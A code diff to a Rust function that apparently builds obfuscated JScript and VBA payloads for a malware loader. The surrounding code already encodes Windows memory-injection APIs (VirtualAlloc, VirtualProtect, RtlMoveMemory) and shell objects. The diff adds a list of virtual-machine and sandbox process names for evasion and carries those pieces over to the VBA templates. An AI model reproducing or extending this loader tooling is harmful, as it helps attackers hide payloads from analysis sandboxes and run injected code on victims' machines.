@@ -260,6 +260,7 @@ fn build_context(config: &LoaderConfig) -> Context {
         ("jsc_winmgmts",          "winmgmts:"),
         ("jsc_fs_obj",            "Scripting.FileSystemObject"),
         ("jsc_wscript_shell",     "WScript.Shell"),
+        ("jsc_vm_procs",          "vmtoolsd.exe|vboxservice.exe|cuckoo.exe|vmsrvc.exe|qemu-ga.exe|prl_tools.exe|xenservice.exe|sandboxiedcomlaunch.exe|vmusrvc.exe"),
     ];
     for &(k, s) in jsc_pairs {
         vars.insert(k, to_charcode_jscript(s));
@@ -276,6 +277,10 @@ fn build_context(config: &LoaderConfig) -> Context {
         ("vba_virtual_alloc",   "VirtualAlloc"),
         ("vba_virtual_protect", "VirtualProtect"),
         ("vba_rtl_move_mem",    "RtlMoveMemory"),
+        ("vba_wscript_shell",   "WScript.Shell"),
+        ("vba_fs_obj",          "Scripting.FileSystemObject"),
+        ("vba_winmgmts",        "winmgmts:"),
+        ("vba_vm_procs",        "vmtoolsd.exe|vboxservice.exe|cuckoo.exe|vmsrvc.exe|qemu-ga.exe|prl_tools.exe|xenservice.exe|sandboxiedcomlaunch.exe|vmusrvc.exe"),
     ];
     for &(k, s) in vba_pairs {
         vars.insert(k, to_charcode_vba(s));
